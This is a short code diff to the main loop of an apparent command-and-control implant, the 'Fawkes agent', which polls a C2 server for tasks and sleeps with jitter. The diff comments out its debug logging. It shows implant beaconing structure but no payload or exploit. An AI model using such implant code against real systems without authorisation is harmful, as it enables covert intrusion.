@@ -48,7 +48,7 @@ func main() {
 	// Setup logging
 	if debugBool {
 		log.SetOutput(os.Stdout)
-		log.Println("[DEBUG] Starting Fawkes agent")
+		// log.Println("[DEBUG] Starting Fawkes agent")
 	}
 
 	// Verify required configuration
@@ -149,7 +149,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 			return
 		default:
 			if debugBool {
-				log.Printf("[DEBUG] Main loop iteration (retry count: %d)", retryCount)
+				// log.Printf(\"[DEBUG] Main loop iteration (retry count: %d)\", retryCount)
 			}
 			// Get tasks from C2 server
 			tasks, err := c2.GetTasking(agent)
@@ -162,7 +162,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 					// Sleep longer on repeated failures
 					sleepTime := time.Duration(agent.SleepInterval*3) * time.Second
 					if debugBool {
-						log.Printf("[DEBUG] Sleeping for extended time %v after max retries", sleepTime)
+						// log.Printf("[DEBUG] Sleeping for extended time %v after max retries", sleepTime)
 					}
 					time.Sleep(sleepTime)
 					continue
@@ -170,7 +170,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 				// Use the same sleep calculation for error case
 				sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
 				if debugBool {
-					log.Printf("[DEBUG] Sleeping for %v after error", sleepTime)
+					// log.Printf(\"[DEBUG] Sleeping for %v after error\", sleepTime)
 				}
 				time.Sleep(sleepTime)
 				continue
@@ -179,7 +179,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 			// Reset retry count on successful communication
 			retryCount = 0
 			if debugBool {
-				log.Printf("[DEBUG] GetTasking successful, received %d tasks", len(tasks))
+				// log.Printf("[DEBUG] GetTasking successful, received %d tasks", len(tasks))
 			}
 
 			// Process tasks
@@ -193,7 +193,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 			// Sleep before next iteration
 			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
 			if debugBool {
-				log.Printf("[DEBUG] Sleeping for %v before next check", sleepTime)
+				// log.Printf("[DEBUG] Sleeping for %v before next check", sleepTime)
 			}
 			time.Sleep(sleepTime)
 		}
